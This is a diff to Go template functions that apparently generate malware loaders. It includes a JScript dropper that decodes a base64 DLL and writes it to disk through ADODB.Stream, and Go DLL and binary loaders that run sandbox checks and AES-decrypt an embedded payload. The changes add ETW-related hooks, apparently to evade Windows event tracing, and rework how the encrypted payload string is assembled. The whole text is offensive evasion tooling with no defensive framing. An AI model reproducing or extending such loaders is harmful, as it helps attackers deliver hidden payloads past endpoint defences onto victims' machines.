@@ -198,13 +198,9 @@ func JSfile() string {
     function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
     {var {{.Variables.base6411}}decoded=Magic1({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('ADODB.Stream');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('ADODB.Stream');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}
 
-	var {{.Variables.dll_string1name}} = '{{.Variables.dll_string1}}';
-	var {{.Variables.dll_string2name}} = '{{.Variables.dll_string2}}';
-	
-	var {{.Variables.dll}} = {{.Variables.dll_string1name}} + {{.Variables.dll_string2name}};
-    
+    {{.Variables.dll}}
    
-	{{.Variables.binaryWriter}}({{.Variables.dll}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
+	{{.Variables.binaryWriter}}({{.Variables.dllvar}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
 	{{.Variables.Loader}}
 
 
@@ -331,6 +327,8 @@ func DLL_Refresher() string {
 
 	}
 
+	{{.Variables.ETW_Function}}
+
 	func main() {
 	}
 
@@ -344,7 +342,10 @@ func DLL_Refresher() string {
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
 		}
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.ciphertext}}")
+		{{.Variables.ETW}}
+		{{.Variables.ciphertext}}
+		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
+
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
 		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
 	
@@ -573,9 +574,7 @@ func Binary() string {
 		{{.Variables.Pointer}}
 		{{.Variables.ptr}} := func() {
 		}
-		{{.Variables.b64_string1name}} := "{{.Variables.b64_string1value}}"
-		{{.Variables.b64_string2name}} := "{{.Variables.b64_string2value}}"
-		{{.Variables.fullciphertext}} := {{.Variables.b64_string1name}} + {{.Variables.b64_string2name}} 
+		{{.Variables.ciphertext}}
 		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
 		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
@@ -769,7 +768,9 @@ func DLL() string {
 	func Start() {
 		{{.Variables.Sandbox}}
 		{{.Variables.Versionfunc}}()
-		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.ciphertext}}")
+		{{.Variables.ETW}}
+		{{.Variables.ciphertext}}
+		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString({{.Variables.fullciphertext}})
 		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
 		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
 	
